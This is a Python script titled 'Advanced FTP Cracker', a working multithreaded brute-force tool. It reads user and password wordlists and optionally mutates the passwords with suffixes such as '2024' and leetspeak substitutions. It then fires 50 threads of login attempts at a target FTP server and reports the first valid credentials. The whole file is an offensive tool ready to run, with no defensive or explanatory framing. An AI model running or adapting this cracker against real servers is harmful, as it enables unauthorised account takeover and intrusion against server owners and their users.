import socket
import argparse
import ftplib
from threading import Thread, Lock, Event
from queue import Queue

combo_queue = Queue()
result_lock = Lock()
stop_event = Event()

parser = argparse.ArgumentParser(description="Advanced FTP Cracker")
parser.add_argument("-t", "--target", required=True, type=str, help="Enter the target")
parser.add_argument("-u", "--user", type=str, required=True, help="Enter the user or a Wordlist to user names")
parser.add_argument("-p", "--passwd", type=str, required=True, help="Enter the path to wordlist containing passwords")
parser.add_argument("-m", "--mutate", action="store_true", help="Enable this flag to mutate password wordlist")

args = parser.parse_args()

host = args.target
user = args.user
passwd = args.passwd
mutant = args.mutate

def smart_mutate(base_word):
    leet_map = {'a': '@', 'i': '1', 'e': '3', 'o': '0', 's': '$'}
    mutations = set()

    mutations.add(base_word)
    mutations.add(base_word.capitalize())
    mutations.add(base_word.upper())

    suffixes = ["123", "!", "2024", "@"]
    for word in list(mutations):
        for suffix in suffixes:
            mutations.add(word + suffix)

    for word in list(mutations):
        for orig, repl in leet_map.items():
            if orig in word:
                mutations.add(word.replace(orig, repl))

    return mutations

def load_lines(filepath):
    with open(filepath, 'r', encoding='utf-8') as f:
        return [line.strip() for line in f if line.strip()]

users = load_lines(user)
passwords = load_lines(passwd)

if mutant:
    for userc in users:
        for base in passwords:
            for mutated in smart_mutate(base):
                combo_queue.put((userc, mutated))
else:
    for userc in users:
        for password in passwords:
            combo_queue.put((userc, password))

truepass = []
trueuser = []

def ftp_worker():
    while not combo_queue.empty() and not stop_event.is_set():
        user, password = combo_queue.get()
        try:
            with ftplib.FTP() as ftp:
                ftp.connect(host, 21, timeout=5)
                ftp.login(user, password)

                with result_lock:
                    print(f"✅ SUCCESS 🎉 {user} : {password}")
                    trueuser.append(user)
                    truepass.append(password)
                    stop_event.set()

        except Exception:
            with result_lock:
                print(f"❌ FAIL    {user} : {password}")
        finally:
            combo_queue.task_done()

threads = []
for _ in range(50):
    t = Thread(target=ftp_worker)
    t.daemon = True
    t.start()
    threads.append(t)

combo_queue.join()

print("\n=====================================================\n")
if trueuser and truepass:
    print(f"✅  USER       :   {trueuser[0]}")
    print(f"✅  PASSWORD   :   {truepass[0]}")
else:
    print("❌ No valid FTP credentials found.")
